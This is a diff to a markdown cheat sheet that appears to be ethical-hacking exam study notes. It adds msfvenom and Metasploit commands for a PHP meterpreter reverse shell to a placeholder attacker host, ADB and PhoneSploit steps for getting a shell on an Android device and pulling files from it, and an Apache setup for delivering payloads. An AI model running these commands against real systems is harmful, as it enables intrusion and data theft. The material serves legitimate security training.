@@ -44,10 +44,16 @@ nmap -Pn -A x.x.x.1/24 -vv --open
   <summary>Web Hacking</summary>
   
 ## File Upload Vulnerability
+
+* To create a PHP Payload 
+* Copy the PHP code and create a .php
   
 ```console
 msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw
-
+```
+  
+* To create a Reverse_tcp Connection
+```console
 msfconsole
 use exploit/multi/handler
 set payload php/meterepreter/reverse_tcp
@@ -55,12 +61,18 @@ set LHOST = attacker-ip
 set LPORT = attcker-port
 run
 ```
+
+
+  
+##
 </details>
 
 # Android Hacking
 <details>
   <summary>ADB</summary>
-### ADB
+
+  ## ADB
+  
 * To Install ADB
 ```console
 apt-get update
@@ -70,7 +82,7 @@ adb devices -l
 * Connection Establish Steps
 
 ```console
-adb connect 192.168.0.4:5555
+adb connect x.x.x.x:5555
 adb devices -l
 adb shell  
 ```
@@ -91,8 +103,10 @@ adb pull sdcard/log.txt /home/mmurphy/Desktop
 <details>
   <summary>PhoneSploit</summary>
   
-### PhoneSploit tool 
+## PhoneSploit tool
+  
 * To install Phonesploit 
+
 ```console
 git clone https://github.com/aerosol-can/PhoneSploit
 cd PhoneSploit
@@ -116,6 +130,36 @@ sdcard/Download/secret.txt
 ```  
 </details>
 
+
+# File Transfer
+<details>
+  <summary>File Transfer</summary>
+  
+## File Transfer
+
+### Linux to Windows
+* used to send a payload by Apache 
+```console
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /root/Desktop/filename /var/www/html/share/
+  ```
+  * to start and verify
+  ```console
+  service apache2 start 
+  service apache2 status
+  ```
+  * to Download from Windows
+  * Open browser 
+  ```shell
+  IP_OF_LINUX/share
+  ```
+### Windows to Linux 
+* File system > Network > smb///IP_OF_WINDOWS
+</details>
+
+
 # Resource
 <details>
   <summary>Course</summary>
@@ -124,7 +168,7 @@ sdcard/Download/secret.txt
 * [Practical Ethical Hacking - PEH ](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) from [TCM Security](https://tcm-sec.com/)
 * [iLab](https://ilabs.eccouncil.org/ethical-hacking-exercises/) CEH (Practical) Official Lab from [EC-Council](https://www.eccouncil.org/)
 * [Youtube free iLab ](https://www.youtube.com/watch?v=9g5gdhoDotg&list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO)
-* []()
+
 </details>
 <details>
   <summary>TryHackMe</summary>
